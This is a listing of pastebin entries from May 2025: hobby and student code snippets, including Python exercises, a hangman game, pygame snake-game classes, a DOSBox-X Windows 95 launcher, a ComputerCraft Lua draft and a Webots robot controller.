        camera.CFrame = camera.CFrame * CFrame.Angles(0, 0, deltaRoll)
        currentRoll = currentRoll + deltaRoll
    end
end)
"
mFLFK0wF,04. Search,Andonoff,Python,Wednesday 28th of May 2025 12:38:50 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element: # <- махаме елемента, в който думата я няма.
        data_list.remove(element)
        
print(data_list)"
MGKKFrE2,Untitled,Andonoff,Python,Wednesday 28th of May 2025 12:36:45 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element:
        data_list.remove(element)
    print(element)
print(data_list)"
YkNySMaz,DosBox - Win95 image,caffeine314,Batch,Wednesday 28th of May 2025 12:22:02 PM CDT,"@echo off

set ""DOSBOX_EXE=D:\Program Files\DOSBox-X\dosbox-x.exe""
set ""DOGDAY_DIR=E:\Gaming\DosBox\DogDay""
set ""WIN_ISO=WIN950~1.ISO""

:: A larger disk image (e.g., 500MB–2GB) that emulates a hard drive.  Acts as a
:: virtual C: drive where Win 95 will actually be installed and run.  Created with:
::    imgmake win95.img -t hd -chs 512,16,63 -size 500
set ""WIN_IMG=hdd.img""

:: A 1.44MB floppy image that emulates a bootable DOS disk.  Used to boot into DOS
:: so you can partition and format the hard drive and start the Win 95 installer
set ""BOOT_IMG=win95b.img""



cd /d ""%DOGDAY_DIR%""

""%DOSBOX_EXE%"" ^
  -c ""mount y ."" ^
  -c ""imgmount 2 y:\%WIN_IMG% -t hdd -fs none -ide 1"" ^
  -c ""imgmount 3 y:\%WIN_ISO% -t cdrom -ide 2m"" ^
  -c ""boot y:\%BOOT_IMG%""

"
4kjaS7jN,FinalProject,slavi146,Python,Wednesday 28th of May 2025 11:58:30 AM CDT,"def word_counter(text):
    word_count = {}
    textwords = text.lower().split()
    for word in textwords:
        word = """".join(char for char in word if char.isalpha())
        if word.isalpha():
            if word in word_count:
                word_count[word] += 1
            else:
                word_count[word] = 1
        else:
            try:
                raise ValueError(""Input must be only string!"")
            except ValueError:
                print(""Everything is fine."")
    return word_count
text = input()

dict = word_counter(text)
for i, j in dict.items():
    print(f'{i}:{j}')

with open('rechnik s dumi i tehniq broi', 'w') as f:
    for i, j in dict.items():
        f.write(f'{i}:{j}\n')

setwithvalues = set(dict.values())
print(setwithvalues)


list_words = list(dict.keys())
print(list_words)


"
zhDKutzK,jablko.py,black_duck11,Python,Wednesday 28th of May 2025 11:22:11 AM CDT,"import random
import pygame
class Jablko(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.obraz=pygame.image.load('images/apple.png')
        self.rect=pygame.Rect(random.randint(0,24)*32,random.randint(0,18)*32,32,32)

"
e3d5jwDt,kati,boyan1324,Python,Wednesday 28th of May 2025 11:18:47 AM CDT,"import random

# Думи за игра
words = [""компютър"", ""училище"", ""игра"", ""часовник"", ""кола"", ""пъзел""]

# Избиране на дума
chosen_word = random.choice(words)
hidden_letters = [""_"" for _ in chosen_word]
guessed_letters = []
tries = 9

# Статистика (речник)
stats = {
    ""опити"": tries,
    ""грешки"": 0,
    ""познати_букви"": 0
}

print(""=== Игра на Бесеница ==="")

while ""_"" in hidden_letters and tries > 0:
    print(""\nДума: "", "" "".join(hidden_letters))
    print(""Оставащи опити:"", tries)
    print(""Познати букви:"", "", "".join(guessed_letters))

    try:
        letter = input(""Въведи буква: "").strip().lower()

        if not letter.isalpha() or len(letter) != 1:
            raise ValueError(""Моля, въведи само една буква."")

        if letter in guessed_letters:
            print(""Вече си пробвал тази буква."")
            continue

        guessed_letters.append(letter)

        if letter in chosen_word:
            for i in range(len(chosen_word)):
                if chosen_word[i] == letter:
                    hidden_letters[i] = letter
                    stats[""познати_букви""] += 1
            print(""Позна!"")
        else:
            tries -= 1
            stats[""грешки""] += 1
            print(""Грешка!"")

    except ValueError as ve:
        print(""Грешка:"", ve)
    except Exception as e:
        print(""Възникна неочаквана грешка:"", e)

# Резултат (tuple)
result = (""Поздравления!"" if ""_"" not in hidden_letters else ""Не успя."",
          chosen_word,
          stats[""познати_букви""],
          stats[""грешки""])

print(""\n=== Край на играта ==="")
print(result[0])
print(f""Думата беше: {result[1]}"")
print(f""Познати букви: {result[2]}, Грешки: {result[3]}"")

# Запис във файл (file handling)
try:
    with open(""hangman_results.txt"", ""a"", encoding=""utf-8"") as file:
        file.write(f""Резултат: {result[0]}, Дума: {result[1]}, Познати: {result[2]}, Грешки: {result[3]}\n"")
    print(""Резултатът е записан във файл hangman_results.txt"")
except Exception:
    print(""Грешка при запис във файл."")
"
1y5JZ4dk,Segment.py,black_duck11,Python,Wednesday 28th of May 2025 11:13:08 AM CDT,"import pygame
import copy
class Segment(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.obraz=pygame.image.load('images/segment.png')
        
        self.pozycja=pygame.Rect(-32,-32,32,32)
        self.ostatnia_pozycja=None
    def przesun(self,nowa_pozycja):
        self.ostatnia_pozycja=copy.deepcopy(self.pozycja)
        self.pozycja=copy.deepcopy(nowa_pozycja)
       

"
eDNsazPj,backpackloot.lua,Ubidibity,Lua,Wednesday 28th of May 2025 10:57:18 AM CDT,"-- Mobs drop backpacks now.  great.  This is my first attempt at repurposing this program to go through a backpack and empty it out

-- Rough draft!!

local chest=peripheral.wrap(""back"")
local chest2=peripheral.wrap(""right"")

local backpack=peripheral.wrap(""front"")
local size=backpack.size()

print(backpack.name.."", ""..backpack.size)

for x=1,chest.size() do
  turtle.dig()
  turtle.  -- this is incomplete, I'll come back to it but have RL stuff to do right now.
  for i=1,size do
    local slot = backpack.getItemDetail(i)
    if backpack.getItemDetail(i)~=nil then
      print(""slot ""..i..""contains ""..slot.name) -- find relevant property to check max_dmg=""..slot.max_dmg.."", dmg=""..slot.dmg)
      backpack.pushItem(""UP"",1)
    end
  end
"
xca9emyp,Dataset Download,Infinity99HD,Python,Wednesday 28th of May 2025 10:46:32 AM CDT,"# Dataset download

def download_dataset(
        url=""https://proai-datasets.s3.eu-west-3.amazonaws.com/progetto-finale-flowes.tar.gz"", 
        tar_name=""progetto-finale-flowes.tar.gz"", 
        extracted_file_name=""progetto-finale-flowes""
                     ):
    """"""
    Downloads and extracts the dataset if it does not already exist.
    """"""

    if not os.path.exists(""progetto-finale-flowes.tar.gz""):
        print(""Downloading dataset..."")
        file = requests.get(url)

        if file.status_code == 200:
            with open(tar_name, ""wb"") as f:
                f.write(file.content)
                print(""Download complete!"")

            if not os.path.exists(extracted_file_name):
                print(""Extracting dataset..."")
                with tarfile.open(tar_name, ""r:gz"") as f:
                    f.extractall(path=extracted_file_name)
                    print(""Extraction complete!"")

                    # Change directory to the extracted folder
                    os.rename(""progetto-finale-flowes/progetto-finale-flowes"", ""dataset"")
        else:
            print(""Failed to download dataset. Status code:"", file.status_code)"
RAnyV25g,Kierunek.py,black_duck11,Python,Wednesday 28th of May 2025 10:10:33 AM CDT,"from enum import Enum
class Kierunek(Enum):
    GORA = 0
    PRAWO = 1
    DOL = 2
    LEWO = 3"
aa7k6rW5,Waz.py,black_duck11,Python,Wednesday 28th of May 2025 10:09:12 AM CDT,"import pygame
import copy
from Kierunek import Kierunek
from Segment import Segment
class Waz(pygame.sprite.Sprite):
    def __init__(self):
    #oryginalny obraz głowy
        
        self.oryginalny_obraz = pygame.image.load(""images/head.png"")
    
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz, 0)
    #współrzędne głowy
        self.rect = self.obraz.get_rect(center=(12*32+16, 9*32+16))#aktualna pozycja
        self.kierunek = Kierunek.GORA
        self.nowy_kierunek = Kierunek.GORA
        self.ostatnia_pozycja=self.rect
        self.dodaj_segment=False
        self.segmenty=[]#lista ze wszystkimi segmentami


        
    def zmien_kierunek(self, kierunek):
        zmiana_mozliwa = True
        if kierunek == Kierunek.GORA and self.kierunek == Kierunek.DOL:
            zmiana_mozliwa = False
        if kierunek == Kierunek.DOL and self.kierunek == Kierunek.GORA:
            zmiana_mozliwa=False
        if kierunek == Kierunek.LEWO and self.kierunek == Kierunek.PRAWO:
            zmiana_mozliwa = False
        if kierunek == Kierunek.PRAWO and self.kierunek == Kierunek.LEWO:
            zmiana_mozliwa = False
        if zmiana_mozliwa:
            self.nowy_kierunek = kierunek
            
    def aktualizuj(self):
        self.kierunek = self.nowy_kierunek
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz,(self.kierunek.value*-90))
        self.ostatnia_pozycja=copy.deepcopy(self.rect)
        if self.kierunek == Kierunek.GORA:
            self.rect.move_ip(0, -32)
        if self.kierunek == Kierunek.PRAWO:
            self.rect.move_ip(32, 0)
        if self.kierunek == Kierunek.LEWO:
            self.rect.move_ip(-32, 0)
        if self.kierunek == Kierunek.DOL:
            self.rect.move_ip(0, 32)
        for segment in range(len(self.segmenty)):
            #dla pierwszego segmenty
            if segment==0:
                #przesunięcie pierwszego segmentu do ostatniej pozycji głowy
                self.segmenty[segment].przesun(self.ostatnia_pozycja)
            else:
                self.segmenty[segment].przesun(self.segmenty[segment-1].ostatnia_pozycja)
        if self.dodaj_segment:
            nowy_segment=Segment()
            nowa_pozycja=None
            if len(self.segmenty)>0:
                nowa_pozycja =copy.deepcopy(self.segmenty[-1].pozycja)
            else:
                nowa_pozycja=copy.deepcopy(self.ostatnia_pozycja)
            nowy_segment.pozycja=nowa_pozycja
            self.segmenty.append(nowy_segment)
            self.dodaj_segment=False
            
    def rysuj_segment(self,ekran):
        for segment in self.segmenty:
            ekran.blit(segment.obraz,segment.pozycja)
    def jedz_jablko(self):
        self.dodaj_segment=True
    





        



        "
piq3dpgy,4wheelscontroller.py,DrAungWinHtut,Python,Wednesday 28th of May 2025 10:00:56 AM CDT,"from controller import Robot

if __name__=='__main__':
    robot = Robot()
    
    timestep = 64
    max_speed = 6.28
    
    left_front_motor = robot.getDevice('motor_left_front')
    right_front_motor = robot.getDevice('motor_right_front')
    left_back_motor = robot.getDevice('motor_left_back')
    right_back_motor = robot.getDevice('motor_right_back')
    #left_motor.setPosition(float('inf'))
    left_front_motor.setPosition(float('inf'))
    right_front_motor.setPosition(float('inf'))
    left_back_motor.setPosition(float('inf'))
    right_back_motor.setPosition(float('inf'))
    left_front_motor.setVelocity(10);
    right_front_motor.setVelocity(10);
    left_back_motor.setVelocity(10);
    right_back_motor.setVelocity(10);
    "
